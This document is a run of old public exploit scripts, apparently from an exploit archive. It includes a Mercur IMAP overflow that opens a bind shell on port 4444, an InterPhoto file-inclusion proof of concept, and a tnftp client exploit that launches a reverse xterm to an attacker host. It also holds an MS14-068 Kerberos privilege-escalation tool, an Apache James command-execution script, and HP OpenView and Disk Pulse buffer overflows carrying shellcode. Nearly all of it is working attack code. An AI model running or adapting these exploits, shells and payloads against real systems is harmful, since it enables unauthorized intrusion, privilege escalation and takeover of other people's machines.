"\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
"\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
"\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
"\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
"\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
"\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
"\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
"\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
"\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
"\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
"\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
"\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
"\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
"\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
"\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
"\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
"\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
"\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
"\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
"\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
"\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
"\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
"\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
"\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
"\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
"\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
"\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
"\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
"\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
"\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
"\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
"\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
"\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a")

# Pad the injected command

bindshell +="\xcc" * 1000

def ExploitMercur(target, username, passwd):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, 143))
	response = sock.recv(1024)
	print response
	login = 'a001 LOGIN ' + username + ' ' + passwd + '\r\n'
	sock.send(login)
	response = sock.recv(1024)
	print response
	imaplist = 'a001 LIST ' + bindshell + '\r\n'
	sock.send(imaplist)
	response = sock.recv(1024)
	print response
	payload = shellcode
	payload += 'L' * 1
	payload += 'Y' * 4
	payload += 'Z' * 4
#	01883A50	FFD3	CALL EBX	MCRFAX.DLL
	payload += struct.pack('<L', 0x01883A50)
	payload += 'L' *  27
	payload += 'M' *  16
	payload += ' ' + '\"/\"' + ' ' + '\"\"'
	req = 'a001 SUBSCRIBE ' + payload + '\r\n'
	sock.send(req)
	sock.close()
	print 'Shell on port 4444'

def ConnectRemoteShell(target):
	connect = "/usr/bin/telnet " + target + " 4444"
	os.system(connect)

if __name__=="__main__":
	try:
		target = sys.argv[1]
		username = sys.argv[2]
		passwd = sys.argv[3]
	except IndexError:
		print 'Usage: %s <imap server> <username> <password>\n' % sys.argv[0]
		sys.exit(-1)
	ExploitMercur(target, username, passwd)

# milw0rm.com [2007-03-21]
source: http://www.securityfocus.com/bid/46759/info

InterPhoto Image Gallery is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially sensitive information and to execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.

InterPhoto Image Gallery 2.4.2 is vulnerable; other versions may also be affected. 

# ------------------------------------------------------------------------
# Software................InterPhoto 2.4.2
# Vulnerability...........Local File Inclusion
# Threat Level............Critical (4/5)
# Download................http://www.weensoft.com/
# Release Date............3/4/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ........................Bryce Darling <bryce@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A local file inclusion vulnerability in InterPhoto 2.4.2 can be
# exploited to include arbitrary files.
# 
# 
# --PoC--

import socket

host = 'localhost'
path = '/interphoto'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

s.send('POST ' + path + '/about.php HTTP/1.1\r\n'
    'Host: localhost\r\n'
    'Connection: keep-alive\r\n'
    'User-Agent: x\r\n'
    'Content-Length: 0\r\n'
    'Cache-Control: max-age=0\r\n'
    'Origin: null\r\n'
    'Content-Type: multipart/form-data; boundary=----x\r\n'
    'Cookie: IPLANGV6O1or24t6cI=' + '..%2f' * 8 + 'windows%2fwin.ini%00\r\n'
    'Accept: text/html\r\n'
    'Accept-Language: en-US,en;q=0.8\r\n'
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
    '\r\n')

print s.recv(8192)#!/usr/bin/env python2
#
# Exploit Title: [tnftp BSD exploit]
# Date: [11/29/2014]
# Exploit Author: [dash]
# Vendor Homepage: [www.freebsd.org]
# Version: [FreeBSD 8/9/10]
# Tested on: [FreeBSD 9.3]
# CVE : [CVE-2014-8517]

# tnftp exploit (CVE-2014-8517)tested against freebsd 9.3
# https://www.freebsd.org/security/advisories/FreeBSD-SA-14:26.ftp.asc
#
# 29 Nov 2014 by dash@hack4.org
#
# usage: 
# 
# redirect the vulnerable ftp client requests for http to your machine
#
# client will do something like: 
# ftp http://ftp.freebsd.org/data.txt
#
# you will intercept the dns request and redirect victim to your fake webserver ip
#
# attacker: start on 192.168.2.1 Xnest: Xnest -ac :1 
# probably do also xhost+victimip
#
# attacker: python CVE-2014-8517.py 192.168.1.1 81 192.168.1.1
# 
# sadly you cannot put a slash behind the | also www-encoded is not working
# plus problems with extra pipes
# this renders a lot of usefull commands useless
# so xterm -display it was ;)
#
# *dirty* *dirdy* *dyrdy* *shell* !
#

import os
import sys
import time
import socket


def usage():
	print "CVE-2014-8517 tnftp exploit"
	print "by dash@hack4.org in 29 Nov 2014"
	print
	print "%s <redirect ip> <redirect port> <reverse xterm ip>"% (sys.argv[0])
	print "%s 192.168.1.1 81 192.168.2.1"% (sys.argv[0])

#bind a fake webserver on 0.0.0.0 port 80
def webserveRedirect(redirect):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("0.0.0.0",80))
	s.listen(3)
	h, c = s.accept()

	#wait for request
	#print h.recv(1024)

	#send 302 
	print "[+] Sending redirect :>"
	h.send(redirect)
	s.close()
	return 0

#bind a fake webserver on port %rport
def deliverUgga(owned):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("0.0.0.0",rport))
	s.listen(3)
	h, c = s.accept()

#	print h.recv(1024)
	print "[+] Deliver some content (shell is spwaned now)"
	h.send(owned)
	s.close()

	return 0

owned="""HTTP/1.1 200 Found
Date: Fri, 29 Nov 2014 1:00:03 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 5
Connection: close
Content-Type: text/html; charset=iso-8859-1


ugga ugga
"""

if(os.getuid())!=0:
	print "[-] Sorry, you need root to bind port 80!"
	sys.exit(1)

if len(sys.argv)<3:
	usage()
	sys.exit(1)

rip = sys.argv[1]
rport = int(sys.argv[2])
revip = sys.argv[3]

print "[+] Starting tnftp BSD client side exploit (CVE-2014-8517)"
print "[+] Dont forget to run Xnest -ac :1"

# ok, lets use xterm -display
cmd = "xterm -display %s:1" % (revip)
cmd = cmd.replace(" ","%20")

print "[+] Payload: [%s]" % cmd

redirect = 	"HTTP/1.1 302\r\n"\
		"Content-Type: text/html\r\n"\
		"Connection: keep-alive\r\n"\
		"Location: http://%s:%d/cgi-bin/|%s\r\n"\
 		"\r\n\r\n" % (rip,rport,cmd)

#child process owned data delivery
uggapid = os.fork()
if uggapid == 0:
	uggapid = os.getpid()
	deliverUgga(owned)
else:
#child proces for webserver redirect
	webpid = os.fork()
	if webpid == 0:
		webpid = os.getpid()
		webserveRedirect(redirect)



#childs, come home!
try:
	os.waitpid(webpid,0)
except:
	pass
try:
	os.waitpid(uggapid,0)
except:
	pass

#oh wait :>
time.sleep(5)
#!/usr/bin/python

# MS14-068 Exploit

# Author
# ------
# Sylvain Monne
# Contact : sylvain dot monne at solucom dot fr
# http://twitter.com/bidord



import sys, os
from random import getrandbits
from time import time, localtime, strftime

from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
    AD_WIN2K_PAC
from kek.pac import build_pac, pretty_print_pac
from kek.util import epoch2gt, gt2epoch


def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):

    sys.stderr.write('  [+] Building AS-REQ for %s...' % kdc_a)
    sys.stderr.flush()
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False)
    sys.stderr.write(' Done!\n')
    
    sys.stderr.write('  [+] Sending AS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(as_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving AS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Parsing AS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
    session_key = (int(as_rep_enc['key']['keytype']), str(as_rep_enc['key']['keyvalue']))
    logon_time = gt2epoch(str(as_rep_enc['authtime']))
    tgt_a = as_rep['ticket']
    sys.stderr.write(' Done!\n')


    if krbtgt_a_key is not None:
        print >> sys.sdterr, as_rep.prettyPrint()
        print >> sys.stderr, as_rep_enc.prettyPrint()
        ticket_debug(tgt_a, krbtgt_a_key)
    
    sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_a)
    sys.stderr.flush()
    subkey = generate_subkey()
    nonce = getrandbits(31)
    current_time = time()
    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
    tgs_req = build_tgs_req(user_realm, 'krbtgt', target_realm, user_realm, user_name,
                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_a)
    sys.stderr.flush()
    sock = send_req(tgs_req, kdc_a)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(' Done!\n')

    sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_a)
    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
    session_key2 = (int(tgs_rep_enc['key']['keytype']), str(tgs_rep_enc['key']['keyvalue']))
    tgt_b = tgs_rep['ticket']
    sys.stderr.write(' Done!\n')


    if trust_ab_key is not None:
        pretty_print_pac(pac[1])
        print >> sys.stderr, tgs_rep.prettyPrint()
        print >> sys.stderr, tgs_rep_enc.prettyPrint()
        ticket_debug(tgt_b, trust_ab_key)


    if target_service is not None and target_host is not None and kdc_b is not None:
        sys.stderr.write('  [+] Building TGS-REQ for %s...' % kdc_b)
        sys.stderr.flush()
        subkey = generate_subkey()
        nonce = getrandbits(31)
        current_time = time()
        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,
                                tgt_b, session_key2, subkey, nonce, current_time)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Sending TGS-REQ to %s...' % kdc_b)
        sys.stderr.flush()
        sock = send_req(tgs_req2, kdc_b)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Receiving TGS-REP from %s...' % kdc_b)
        sys.stderr.flush()
        data = recv_rep(sock)
        sys.stderr.write(' Done!\n')

        sys.stderr.write('  [+] Parsing TGS-REP from %s...' % kdc_b)
        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)
        sys.stderr.write(' Done!\n')

    else:
        tgs_rep2 = tgs_rep
        tgs_rep_enc2 = tgs_rep_enc

    sys.stderr.write('  [+] Creating ccache file %r...' % output_filename)
    cc = CCache((user_realm, user_name))
    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)
    cc.add_credential(tgs_cred)
    cc.save(output_filename)
    sys.stderr.write(' Done!\n')


    if target_key is not None:
        print >> sys.stderr, tgs_rep2.prettyPrint()
        print >> sys.stderr, tgs_rep_enc2.prettyPrint()
        ticket_debug(tgs_rep2['ticket'], target_key)


# Pretty print full ticket content
# Only possible in a lab environment when you already know krbtgt and/or service keys
def ticket_debug(ticket, key):
    try:
        ticket_enc = decrypt_ticket_enc_part(ticket, key)
        print >> sys.stderr, ticket.prettyPrint()
        for ad in iter_authorization_data(ticket_enc['authorization-data']):
            print >> sys.stderr, 'AUTHORIZATION-DATA (type: %d):' % ad['ad-type']
            if ad['ad-type'] == AD_WIN2K_PAC:
                pretty_print_pac(str(ad['ad-data']))
            else:
                print >> sys.stderr, str(ad['ad-data']).encode('hex')
    except Exception as e:
        print 'ERROR:', e


if __name__ == '__main__':
    from getopt import getopt
    from getpass import getpass

    def usage_and_exit():
        print >> sys.stderr, 'USAGE:'
        print >> sys.stderr, '%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>' % sys.argv[0]
        print >> sys.stderr, ''
        print >> sys.stderr, 'OPTIONS:'
        print >> sys.stderr, '    -p <clearPassword>'
        print >> sys.stderr, ' --rc4 <ntlmHash>'
        sys.exit(1)

    opts, args = getopt(sys.argv[1:], 'u:s:d:p:', ['rc4='])
    opts = dict(opts)
    if not all(k in opts for k in ('-u', '-s', '-d')):
        usage_and_exit()

    user_name, user_realm = opts['-u'].split('@', 1)
    user_sid = opts['-s']
    kdc_a = opts['-d']

    if '--rc4' in opts:
        user_key = (RC4_HMAC, opts['--rc4'].decode('hex'))
        assert len(user_key[1]) == 16
    elif '-p' in opts:
        user_key = (RC4_HMAC, ntlm_hash(opts['-p']).digest())
    else:
        user_key = (RC4_HMAC, ntlm_hash(getpass('Password: ')).digest())

    target_realm = user_realm
    target_service = target_host = kdc_b = None
    filename = 'TGT_%s@%s.ccache' % (user_name, user_realm)

    user_realm = user_realm.upper()
    target_realm = target_realm.upper()

    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user 
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."#!/usr/bin/python

# Exploit title: HP OpenView NNM OvWebHelp.exe CGI Topic overflow
# Date: 2010.03.30
# Software link: hp.com<http://hp.com>
# Version: 7.53
# Tested on: Windows 2003 SP2
# CVE: 2009-4178
# Code:
############################################
# Trying 172.16.29.130...
# Connected to 172.16.29.130.
# Escape character is '^]'.
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\HP OpenView\www\cgi-bin>
############################################

import struct
import socket
import httplib
import urllib

#[*] x86/alpha_mixed succeeded with size 746 (iteration=1)
sc =(
"\x89\xe3\xd9\xc3\xd9\x73\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x49\x78\x4e\x69\x45\x50\x45\x50\x43\x30\x45\x30\x4e"
"\x69\x48\x65\x44\x71\x4b\x62\x45\x34\x4e\x6b\x51\x42\x44\x70"
"\x4c\x4b\x43\x62\x44\x4c\x4e\x6b\x50\x52\x44\x54\x4e\x6b\x43"
"\x42\x45\x78\x44\x4f\x4e\x57\x50\x4a\x45\x76\x50\x31\x4b\x4f"
"\x46\x51\x49\x50\x4c\x6c\x45\x6c\x43\x51\x43\x4c\x45\x52\x46"
"\x4c\x47\x50\x4f\x31\x48\x4f\x44\x4d\x43\x31\x49\x57\x4b\x52"
"\x48\x70\x51\x42\x43\x67\x4c\x4b\x50\x52\x46\x70\x4e\x6b\x47"
"\x32\x45\x6c\x47\x71\x48\x50\x4c\x4b\x47\x30\x44\x38\x4f\x75"
"\x49\x50\x50\x74\x51\x5a\x43\x31\x4a\x70\x42\x70\x4c\x4b\x43"
"\x78\x46\x78\x4e\x6b\x43\x68\x45\x70\x47\x71\x48\x53\x4a\x43"
"\x45\x6c\x47\x39\x4c\x4b\x47\x44\x4c\x4b\x47\x71\x4a\x76\x44"
"\x71\x4b\x4f\x45\x61\x49\x50\x4c\x6c\x4b\x71\x4a\x6f\x44\x4d"
"\x45\x51\x4a\x67\x47\x48\x4b\x50\x43\x45\x4b\x44\x46\x63\x51"
"\x6d\x49\x68\x45\x6b\x51\x6d\x46\x44\x43\x45\x4d\x32\x46\x38"
"\x4e\x6b\x42\x78\x44\x64\x45\x51\x49\x43\x45\x36\x4c\x4b\x44"
"\x4c\x50\x4b\x4e\x6b\x50\x58\x47\x6c\x45\x51\x49\x43\x4e\x6b"
"\x46\x64\x4e\x6b\x47\x71\x4e\x30\x4f\x79\x50\x44\x46\x44\x51"
"\x34\x43\x6b\x43\x6b\x43\x51\x51\x49\x42\x7a\x46\x31\x49\x6f"
"\x4b\x50\x50\x58\x43\x6f\x50\x5a\x4c\x4b\x44\x52\x48\x6b\x4b"
"\x36\x51\x4d\x51\x78\x45\x63\x46\x52\x43\x30\x43\x30\x43\x58"
"\x42\x57\x42\x53\x46\x52\x51\x4f\x50\x54\x51\x78\x42\x6c\x50"
"\x77\x47\x56\x47\x77\x4b\x4f\x4b\x65\x4c\x78\x4a\x30\x47\x71"
"\x47\x70\x43\x30\x51\x39\x49\x54\x51\x44\x50\x50\x45\x38\x46"
"\x49\x4d\x50\x50\x6b\x43\x30\x49\x6f\x49\x45\x50\x50\x42\x70"
"\x50\x50\x42\x70\x43\x70\x50\x50\x47\x30\x50\x50\x51\x78\x49"
"\x7a\x44\x4f\x49\x4f\x4b\x50\x4b\x4f\x4b\x65\x4e\x69\x4f\x37"
"\x50\x31\x49\x4b\x51\x43\x45\x38\x44\x42\x47\x70\x47\x61\x51"
"\x4c\x4e\x69\x4b\x56\x43\x5a\x46\x70\x42\x76\x51\x47\x50\x68"
"\x4b\x72\x49\x4b\x44\x77\x43\x57\x4b\x4f\x49\x45\x50\x53\x43"
"\x67\x45\x38\x48\x37\x49\x79\x44\x78\x49\x6f\x4b\x4f\x4e\x35"
"\x51\x43\x51\x43\x51\x47\x45\x38\x50\x74\x48\x6c\x47\x4b\x49"
"\x71\x49\x6f\x4a\x75\x42\x77\x4d\x59\x48\x47\x51\x78\x44\x35"
"\x42\x4e\x42\x6d\x50\x61\x49\x6f\x49\x45\x50\x68\x42\x43\x42"
"\x4d\x51\x74\x43\x30\x4d\x59\x49\x73\x50\x57\x46\x37\x43\x67"
"\x50\x31\x48\x76\x42\x4a\x45\x42\x46\x39\x46\x36\x4d\x32\x49"
"\x6d\x42\x46\x48\x47\x43\x74\x46\x44\x47\x4c\x47\x71\x43\x31"
"\x4e\x6d\x43\x74\x51\x34\x46\x70\x4f\x36\x43\x30\x42\x64\x46"
"\x34\x42\x70\x50\x56\x50\x56\x43\x66\x42\x66\x51\x46\x50\x4e"
"\x46\x36\x43\x66\x46\x33\x43\x66\x51\x78\x44\x39\x48\x4c\x47"
"\x4f\x4c\x46\x4b\x4f\x4b\x65\x4e\x69\x4d\x30\x42\x6e\x50\x56"
"\x43\x76\x49\x6f\x46\x50\x43\x58\x44\x48\x4d\x57\x47\x6d\x51"
"\x70\x49\x6f\x4a\x75\x4d\x6b\x4c\x30\x4c\x75\x4f\x52\x43\x66"
"\x42\x48\x4d\x76\x4f\x65\x4d\x6d\x4f\x6d\x49\x6f\x48\x55\x47"
"\x4c\x47\x76\x43\x4c\x45\x5a\x4b\x30\x4b\x4b\x4d\x30\x44\x35"
"\x43\x35\x4f\x4b\x51\x57\x42\x33\x51\x62\x50\x6f\x43\x5a\x45"
"\x50\x42\x73\x49\x6f\x4a\x75\x46\x6a\x41\x41")

data="A"*57
data2 = "B"*5000
ret = "\xDF\xf2\xe5\x77" + "\x90" * 254 + sc # call esp kernel32.dll
payload = data + ret

p = urllib.urlencode({'Topic':payload,'Target':data2})
h = {"Content-Type": "application/x-www-form-urlencoded","Accept": "text/html","User-Agent": "BackTrack", "Accept-Language": "en"}

c = httplib.HTTPConnection('172.16.29.130')
c.request("POST","/OvCgi/OvWebHelp.exe",p,h)
r = c.getresponse()

print r.status, r.reason
c.close()

print "\nDone\n"


#!/usr/bin/python

# Exploit Title: Disk Pulse Server v2.2.34 Remote Buffer Overflow Exploit
# Date: 10/11/2010
# Author: xsploited security
# URL: http://www.x-sploited.com/
# Contact: xsploitedsecurity [at] gmail.com
# Software Link: http://www.diskpulse.com/setups/diskpulsesrv_setup_v2.2.34.exe
# Version: v2.2.34
# Tested on: Windows XP SP3 (Physical machine)
# CVE : N/A

# Vulnerability Information:
# A vulnerability exists in the way Disk Pulse Server v2.2.34 process a remote clients "GetServerInfo" request.
# The vulnerability is caused due to a boundary error in libpal.dll when handling network messages and can be exploited
# to cause a stack-based buffer overflow via a specially crafted packet sent to TCP port 9120.

# Other notes:
# It appears the vendor likes using the same server code (that was effected by my previous PoC: http://www.exploit-db.com/exploits/15231)
# for everything client/server related. It is also safe to say that the client(s) are most likely effected by bugs as well.

# Other possibly affected versions:
# Disk Pulse Server <= 1.7.x

# References:
# http://secunia.com/advisories/41748/
# http://www.exploit-db.com/exploits/15231
# http://securityreason.com/exploitalert/9247

# Shouts:
# kAoTiX, MAX, CorelanCoder, exploit-db (of course), all other security crews and sites.

import sys,socket

if len(sys.argv) != 2:
    print "[!] Usage: ./diskpulse.py <Target IP>"
    sys.exit(1)

about = "=================================================\n"
about += "Title: Disk Pulse Server v2.2.34 Remote BOF PoC\n"
about +=  "Author: xsploited security\nURL: http://www.x-sploited.com/\n"
about +=  "Contact: xsploitedsecurity [at] gmail.com\n"
about +=  "=================================================\n"
print about

host = sys.argv[1]
port = 9120 #default server port

# windows/exec - 218 bytes / http://www.metasploit.com
# Encoder: x86/fnstenv_mov / EXITFUNC=seh, CMD=calc
calc = ("\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x97\x8c" 
"\x8a\x10\x83\xeb\xfc\xe2\xf4\x6b\x64\x03\x10\x97\x8c\xea\x99" 
"\x72\xbd\x58\x74\x1c\xde\xba\x9b\xc5\x80\x01\x42\x83\x07\xf8" 
"\x38\x98\x3b\xc0\x36\xa6\x73\xbb\xd0\x3b\xb0\xeb\x6c\x95\xa0" 
"\xaa\xd1\x58\x81\x8b\xd7\x75\x7c\xd8\x47\x1c\xde\x9a\x9b\xd5" 
"\xb0\x8b\xc0\x1c\xcc\xf2\x95\x57\xf8\xc0\x11\x47\xdc\x01\x58" 
"\x8f\x07\xd2\x30\x96\x5f\x69\x2c\xde\x07\xbe\x9b\x96\x5a\xbb" 
"\xef\xa6\x4c\x26\xd1\x58\x81\x8b\xd7\xaf\x6c\xff\xe4\x94\xf1" 
"\x72\x2b\xea\xa8\xff\xf2\xcf\x07\xd2\x34\x96\x5f\xec\x9b\x9b" 
"\xc7\x01\x48\x8b\x8d\x59\x9b\x93\x07\x8b\xc0\x1e\xc8\xae\x34" 
"\xcc\xd7\xeb\x49\xcd\xdd\x75\xf0\xcf\xd3\xd0\x9b\x85\x67\x0c" 
"\x4d\xfd\x8d\x07\x95\x2e\x8c\x8a\x10\xc7\xe4\xbb\x9b\xf8\x0b" 
"\x75\xc5\x2c\x72\x84\x22\x7d\xe4\x2c\x85\x2a\x11\x75\xc5\xab" 
"\x8a\xf6\x1a\x17\x77\x6a\x65\x92\x37\xcd\x03\xe5\xe3\xe0\x10" 
"\xc4\x73\x5f\x73\xf6\xe0\xe9\x10");
	
# Begin payload buffer:

packet_header = ("\x47\x65\x74\x53\x65\x72\x76\x65\x72\x49\x6E\x66\x6F\x02");		# ASCII = "GetServerInfo."

junk = "\x41" * 256; 			#256 byte junk buffer to reach eip
eip = "\xFB\xF8\xAB\x71";		#jmp esp (via ws2_32.dll)
nops = "\x90" * 12;				#small nop sled

# packet structure:
# [header][junk][eip][nops][shellcode][nops][nops]
packet = packet_header + junk + eip + nops + calc + nops + nops;

print "[*] Connecting to " + host + "...\r"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print "[*] Connected, Sending payload\r"
s.send(packet + "\r\n")
print "[*] Payload sent successfully"
print "[*] Check the results\r"
s.close()#!/usr/bin/python
#
